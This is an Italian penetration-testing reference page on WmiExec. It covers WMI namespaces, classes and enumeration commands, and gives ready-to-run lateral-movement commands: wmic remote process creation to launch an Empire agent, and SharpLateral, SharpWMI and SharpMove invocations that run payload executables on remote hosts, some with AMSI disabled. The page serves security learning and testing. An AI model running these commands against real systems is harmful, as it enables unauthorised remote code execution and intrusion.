# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Spiegazione del funzionamento

I processi possono essere aperti sugli host di cui si conoscono il nome utente e la password o l'hash, utilizzando WMI. I comandi vengono eseguiti tramite WMI da Wmiexec, offrendo un'esperienza di shell semi-interattiva.

**dcomexec.py:** Utilizzando diversi endpoint DCOM, questo script offre una shell semi-interattiva simile a `wmiexec.py`. Il valore `-object` selezionato sceglie l'endpoint; gli oggetti supportati includono `MMC20.Application`, `ShellWindows` e `ShellBrowserWindow`, con quest'ultimo che fornisce la tecnica Shell Browser Window evidenziata nella guida originale.<sup>[[2]](#references)[[3]](#references)</sup>

## Fondamenti di WMI

### Namespace

Strutturato in una gerarchia in stile directory, il contenitore di livello superiore di WMI è \root, al cui interno sono organizzate directory aggiuntive, denominate namespace.<sup>[[1]](#references)</sup>
Comandi per elencare i namespace:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Le classi all'interno di un namespace possono essere elencate utilizzando:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classi**

Conoscere il nome di una classe WMI, come win32_process, e lo spazio dei nomi in cui risiede è fondamentale per qualsiasi operazione WMI.  
Comandi per elencare le classi che iniziano con `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Invocazione di una classe:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metodi

È possibile eseguire i metodi, ovvero una o più funzioni eseguibili delle classi WMI.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Enumerazione WMI

### Stato del servizio WMI

Comandi per verificare se il servizio WMI è operativo:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informazioni sul sistema e sui processi

Raccolta di informazioni sul sistema e sui processi tramite WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Per gli attaccanti, WMI è uno strumento potente per enumerare dati sensibili relativi a sistemi o domini.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
L'interrogazione remota di WMI per ottenere informazioni specifiche, come gli amministratori locali o gli utenti connessi, è possibile con un'attenta costruzione dei comandi.

### **Interrogazione manuale di WMI in remoto**

L'identificazione furtiva degli amministratori locali su una macchina remota e degli utenti connessi può essere ottenuta tramite query WMI specifiche. `wmic` supporta anche la lettura da un file di testo per eseguire comandi simultaneamente su più nodi.<sup>[[1]](#references)</sup>

Per eseguire remotamente un processo tramite WMI, ad esempio per distribuire un agent Empire, viene utilizzata la seguente struttura di comando; l'esecuzione corretta è indicata da un valore restituito pari a "0":<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Questo processo illustra la capacità di WMI di eseguire operazioni da remoto e enumerare i sistemi, evidenziandone l'utilità sia per l'amministrazione dei sistemi sia per il penetration testing.

## Strumenti automatici

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Puoi anche utilizzare **`wmiexec` di Impacket**.


## References

- [1] [Utilizzare le credenziali per ottenere il controllo dei sistemi Windows - Parte 3 (WMI e WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket - dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Guida per principianti al toolkit Impacket, Parte 1 - Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
